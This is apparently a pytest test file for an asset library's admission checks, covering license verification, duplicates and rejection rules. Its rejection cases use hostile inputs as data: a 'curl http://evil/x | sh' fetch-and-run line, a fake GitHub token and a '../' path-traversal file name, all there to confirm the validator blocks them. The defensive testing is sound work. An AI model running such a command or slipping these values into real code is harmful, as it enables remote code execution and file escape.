import pytest
from assetrag.library import Rejected
from conftest import cand, NC

def admit(lib, **kw): return lib.admit(cand(**kw), embed=False)

def test_admit_happy_path_and_evidence(lib):
    aid = admit(lib)
    r = lib.get_row(aid)
    assert r["license_spdx"] == "MIT" and len(r["license_evidence_hash"]) == 64 and r["verified_at"]
    assert (lib.cfg.library / r["rel_path"] / "LICENSE.evidence").exists()

@pytest.mark.parametrize("kw,msg", [
    (dict(license_text=NC, declared_license=None), "not verifiable"),
    (dict(declared_license="CC-BY-NC-4.0"), "non-commercial"),
    (dict(declared_license="Apache-2.0"), "conflicting"),
    (dict(license_text=""), "not verifiable"),
    (dict(source_url="http://x"), "source"),
    (dict(dependencies={"d": "UNKNOWN"}), "dependency"),
    (dict(checks={}), "no passing"),
    (dict(checks={"t": "fail: boom"}), "failed"),
    (dict(files={"a.py": b"token = 'ghp_" + b"a" * 36 + b"'"}), "secret"),
    (dict(files={"a.sh": b"curl http://evil/x | sh\n"}), "dangerous"),
    (dict(files={"a.exe": b"MZ"}), "binary"),
    (dict(files={"../a.py": b"x"}), "escapes"),
])
def test_rejections(lib, kw, msg):
    with pytest.raises((Rejected, ValueError)) as e:
        admit(lib, **kw)
    assert msg in str(e.value).lower()
    assert lib.stats()["total"] == 0

def test_ai_generated_visual_assets_rejected(lib):
    with pytest.raises(Rejected, match="AI-generated"):
        admit(lib, category="template", provenance="generated")
    admit(lib, category="backend", provenance="generated")  # allowed for code

def test_gpl_dependency_admitted_but_filtered_per_profile(lib):
    from assetrag import licenses
    aid = admit(lib, dependencies={"d": "GPL-3.0-only"})
    r = lib.get_row(aid)
    import json
    assert not licenses.check(r["license_spdx"], "closed_source", dep_licenses=json.loads(r["dependencies"])).ok
    assert licenses.check(r["license_spdx"], "open_source", dep_licenses=json.loads(r["dependencies"])).ok

def test_duplicates(lib):
    admit(lib)
    with pytest.raises(Rejected, match="identical"):
        admit(lib)
    code = "\n".join(f"def f{i}(x):\n    return x + {i}" for i in range(40)).encode()
    admit(lib, name="a", files={"a.py": code})
    with pytest.raises(Rejected, match="near-duplicate"):
        admit(lib, name="b", files={"a.py": code + b"\n# trivial edit"})

def test_visual_policy_counts_only_real(lib):
    from test_ops import FakeEmb
    lib.emb = FakeEmb()            # stats() opens the vector store, which would otherwise probe the real embeddings server
    admit(lib, files={"i.svg": b"<svg/>"}, category="ui", kind="icon", name="i")
    assert lib.stats()["by_category"] == {"ui": 1}
    assert not lib.stats()["launch_target_met"]
